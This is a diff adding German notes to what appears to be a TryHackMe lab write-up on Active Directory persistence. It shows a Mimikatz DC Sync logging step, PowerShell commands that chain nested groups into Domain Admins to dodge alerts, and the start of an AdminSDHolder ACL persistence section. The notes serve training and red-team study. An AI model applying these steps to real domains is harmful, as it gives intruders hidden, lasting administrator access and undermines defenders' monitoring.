@@ -127,8 +127,8 @@ Wir sehen einiges an Output, aber vorallem einen NTLM Hash des Benutzers aaron.j
 Wir wollen aber natürlich ALLE Accounts DC Syncen. Dazu aktivieren das logging in Mimikatz:
 
 ```bash
-mimikatz # log <username>_dcdump.txt 
-Using '<username>_dcdump.txt' for logfile: OK
+mimikatz # log aaron.jones_dcdump.txt 
+Using 'aaron.jones_dcdump.txt' for logfile: OK
 ```
 
 Anstatt unser Konto anzugeben, verwenden wir nun das Flag /all:
@@ -732,6 +732,105 @@ Selbst wenn du einen SID History Eintrag löschen möchtest, musst du erstmal ei
 
 # Persistence through Group Membership
 
+Wenn wir uns nicht mit SID Historys abgeben möchten, können wir uns selber einfach AD Gruppen hinzufügen. SID History ist zwar ne ganz coole Technik, aber Credential Rotation und Cleanups könnten die Persistence entfernen. Daher ist es in manchen Fällen sinnvoller, Persistence über die AD Gruppen selber zu sichern.
 
+### Persistence through Group Membership
+
+Wie bereits schonmal erwähnt, ist nicht immer der höchst privilegierte Account, oder Gruppe auch die besten Option für Persistence. Denn diese Accounts oder Gruppen werden entsprechend intensiv überwacht. Sicherheitsrelevante Gruppen die geschützt werden müssen wie Domain Admins oder Enterprise Admins bedürfen einer intensiven Sicherheit. Also müssen wir unsere Persistence über Gruppen sehr gut durchdenken und schauen, welcher Gruppe wir uns hinzufügen.
+
+- Die IT Support Gruppe kann dazu genutzt werden Privilegien zu erhalten wie bspw. Passwordchange Force. Allerdings ist es meistens nicht möglich die Passwörter von privilegierten Usern zu resetten. Aber wir können die Passwörter von Low-Priv Usern resetten und uns so auf den Workstations ausbreiten.
+
+- Gruppen die lokale Adminrechte besitzen stehen oft nicht unter der gleichen Beobachtung wie bspw. geschützte Gruppen wie Domain Admins. Mit lokalen Adminrechten an den richtigen Hosts mit entsprechender Membership im Netzwerk können wir easy wieder die komplette Domain übernehmen.
+
+- Es muss nicht immer direkt die Privilegien sein. Manchmal sind es Gruppen mit indirekten Privilegien wie bspw. Inhaber einer GPO die gut wür Persistence sind.
+
+### Nested Groups
+
+In den meisten Organisationen gibt es eine signifikante Anzahl an rekursiven Gruppen, also Gruppen die einer anderen Gruppe angehören. Das ist das sogenannte Group Nesting. Ziel von Group Nesting ist eigentlich eine bessere Struktur des AD. Nehmen wir mal die IT Support Gruppe, eine sehr allgemeine Gruppe. Daher gibt es innerhalb dieser Gruppe evtl. die Gruppe Helpdesk, Access Card Managers oder Network Managers. Diese Gruppen können alle der IT Support Gruppe angehören, was diesen Gruppen dann entsprechende Rechte vergibt, aber wir können den einzelnen Gruppen innerhalb von IT Support noch feinere Rechte zuweisen. 
+
+Das Group Nesting hilft zwar bei der Strukturierung des AD, macht die Zugänge allerdings leicht unübersichtlich. Nehmen wir wieder die IT Support Gruppe als Beispiel. Wenn wir im AD sehen wollen, wieviele Mitglieder der IT Support angehören, werden uns dann Drei zurückgegeben. Wenn diese Untergruppen allerdings ebenfalls Gruppen enthalten, müsste man diese ebenfalls durchsuchen.
+Die Frage ist also, wieviele Ebenen müssen wir uns anschauen um herauszufinden, wieviele Zugänge es in dieser Gruppe gibt.
+
+Das führt zu einem Überwachungsproblem. Nehmen wir mal an, wir haben einen Alarm der losgeht, sobald ein neuer Benutzer der Domain Admin Gruppe hinzugefügt wird. Es ist gut, so einen Alarm zu haben, allerdings geht er nicht los, wenn man den Benutzer einer Untergruppe von Domain Admin hinzufügt. Das ist ein gängiges Problem, da AD vom AD Team gemanaged wird, das Alerting und Monitorin jedoch vom Team der InfoSec. Wir brauchen also nur ein wenig fehlende Kommunikation, und schon können wir Subgruppen ausnutzen, ohne das ein Alarm losgeht.
+
+Als Angreifer können wir diesen Umstand ausnutzen und Persistence erreichen. Anstatt uns auf die Gruppen konzentrieren, die die entsprechenden Rechte liefern würden, zielen wir auf deren Subgruppen ab. 
+
+### Nesting Our Persistence
+
+Wir simulieren diese Technik mal. Dazu erstellen wir eine neue Gruppe und verstecken diese in People-> IT Organisational Unit:
+
+```bash
+PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "aaron.jones Net Group 1" -SamAccountName "aaron.jones_nestgroup1" -DisplayName "aaron.jones Nest Group 1" -GroupScope Global -GroupCategory Security
+```
+
+Lass uns eine weitere Gruppe erstellen in der People -> Sales OU und dort unsere vorherige Gruppe als Mitglied hinzufügen:
+
+```bash
+PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "aaron.jones Net Group 2" -SamAccountName "aaron.jones_nestgroup2" -DisplayName "aaron.jones Nest Group 2" -GroupScope Global -GroupCategory Security 
+PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "aaron.jones_nestgroup2" -Members "aaron.jones_nestgroup1"
+```
+
+Wir können das noch einige male machen und jedesmal die vorherige Gruppe als Mitglied hinzufügen:
+
+```bash
+PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "aaron.jones Net Group 3" -SamAccountName "aaron.jones_nestgroup3" -DisplayName "aaron.jones Nest Group 3" -GroupScope Global -GroupCategory Security
+PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "aaron.jones_nestgroup3" -Members "aaron.jones_nestgroup2"
+PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "aaron.jones Net Group 4" -SamAccountName "aaron.jones_nestgroup4" -DisplayName "aaron.jones Nest Group 4" -GroupScope Global -GroupCategory Security
+PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "aaron.jones_nestgroup4" -Members "aaron.jones_nestgroup3"
+PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "aaron.jones Net Group 5" -SamAccountName "aaron.jones_nestgroup5" -DisplayName "aaron.jones Nest Group 5" -GroupScope Global -GroupCategory Security
+PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "aaron.jones_nestgroup5" -Members "aaron.jones_nestgroup4"
+```
+
+Die letzte Gruppe fügen wir jetzt als Mitglied der Domain Admin Gruppe hinzu.
+
+```bash
+PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
+```
+
+Und letztendlich fügen wir unseren Low-Priv AD User der Gruppe hinzu, die wir als erstes erstellt haben. 
+
+```bash
+PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
+```
+
+Unserer low-priv User "aaron.jones" sollte sofort Zugang zum Domain Controller bekommen. Wir loggen uns mit diesem User per SSH auf THMWRK1 ein und überprüfen das:
+
+```bash
+za\aaron.jones@THMWRK1 C:\Users\aaron.jones>dir \\thmdc.za.tryhackme.loc\c$\ 
+ Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows 
+ Volume Serial Number is 1634-22A9
+
+ Directory of \\thmdc.za.tryhackme.loc\c$
+
+01/04/2022  08:47 AM               103 delete-vagrant-user.ps1     
+05/01/2022  09:11 AM               169 dns_entries.csv
+09/15/2018  08:19 AM    <DIR>          PerfLogs
+05/11/2022  10:32 AM    <DIR>          Program Files
+03/21/2020  09:28 PM    <DIR>          Program Files (x86)
+05/01/2022  09:17 AM             1,725 thm-network-setup-dc.ps1    
+04/25/2022  07:13 PM    <DIR>          tmp
+05/15/2022  09:16 PM    <DIR>          Tools
+04/27/2022  08:22 AM    <DIR>          Users
+04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant] 
+04/27/2022  08:12 PM    <DIR>          Windows
+               3 File(s)          1,997 bytes
+               8 Dir(s)  51,573,755,904 bytes free
+```
+
+Wenn es sich um eine reale Organisation handeln würde, würden wir keine neuen Gruppen erstellen, um sie zu verschachteln. Stattdessen würden wir die vorhandenen Gruppen nutzen, um das Nesting durchzuführen. Das ist etwas, das man bei einem normalen Red-Team Assesment nicht tun würde und fast immer an dieser Stelle abbrechen würde, da es die AD-Struktur der Organisation zerstört. Zu diesem Zeitpunkt müsste die Organisation selbst dann, wenn es dem Blue Team gelungen wäre, uns herauszuschmeißen, höchstwahrscheinlich ihre gesamte AD-Struktur von Grund auf neu aufbauen, was zu erheblichen Schäden führen.
+
+# Persistence through ACLs
+
+Manchmal braucht es mehr als Persistence über AD Gruppen zu erlangen. Was ist, wenn wir Persistence in allen geschütztzen Gruppen gleichzeitig haben möchten?
+
+### Persisting through AD Group Templates
+
+Klar, wir könnten einfach einen Account zu jeder privilegierten Gruppe hinzufügen die wir finden. Dennoch könnte uns das Blue Team rauswerfen nach einem Cleanup und unsere Mitgliedschaft löschen. Daher können wir bessere Persistance erreichen, wenn wir direkt die Templates injezieren, die die Default Gruppen erstellen. Wenn wir in diese Templates injezieren, selbst wenn das Blue Team unsere Mitgliedschaften löscht, warten wir einfach bis die Templates erneuert werden und schon sind wir wieder Mitglied der entsprechenden Gruppen.
+
+Eins dieser Templates ist der AdminSDHolder Container. Dieser Container exisiert in jeder AD Domain und dessen Access Control List (ACL) wird als Template genutzt um Berechtigungen für alle Geschützten Gruppen zu kopieren. Geschützte Gruppen umfassen Gruppen wie Domain Admins, Administratoren, Enterprise Admin und Schema Admins. Eine vollständige Liste findest du [hier](https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10))
+
+Ein Prozess mit dem Namen "SDProp" nimmt die ACL vom AdminSDHolder Container und wendet diese auf alle Geschützten Gruppen alle 60 Minuten an. Wir können in diese ACE schreiben und uns somit volle Berechtigungen auf alle Geschützten Gruppen geben. Da dieser Vorgang ein normaler AD Prozess ist, taucht er auch nirgendwo auf und es gibt keine Alarme.
+
+### Persisting with AdminSDHolder
 
 
